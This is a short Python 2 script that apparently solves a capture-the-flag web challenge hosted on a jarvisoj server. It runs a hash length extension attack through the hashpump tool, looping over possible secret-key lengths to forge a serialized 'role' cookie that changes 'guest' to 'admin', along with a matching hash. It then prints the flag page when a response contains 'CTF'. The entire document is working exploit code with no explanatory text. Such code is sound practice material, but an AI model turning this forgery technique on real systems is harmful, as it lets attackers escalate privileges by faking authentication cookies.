import os
import requests
import urllib


def rev(s):
    i = 0
    r = ""
    while i < len(s):
        if s[i] == "\\":
            r += chr(int(s[i + 2:i + 4], 16))
            i += 4
        else:
            r += s[i]
            i += 1
    return urllib.quote(r[::-1])


for i in range(4, 32):
    tmp = os.popen(
        '''hashpump -s 3a4727d57463f122833d9e732f94e4e0 --data ';"tseug":5:s' -a ';"nimda":5:s' -k ''' + str(i)).read()
    hsh = tmp.split("\n")[0]
    role = rev(tmp.split("\n")[1])
    cookies = {"role": role, "hsh": hsh}
    print cookies
    if "CTF" in requests.get("http://web.jarvisoj.com:32778/", cookies=cookies).content:
        print requests.get("http://web.jarvisoj.com:32778/", cookies=cookies).content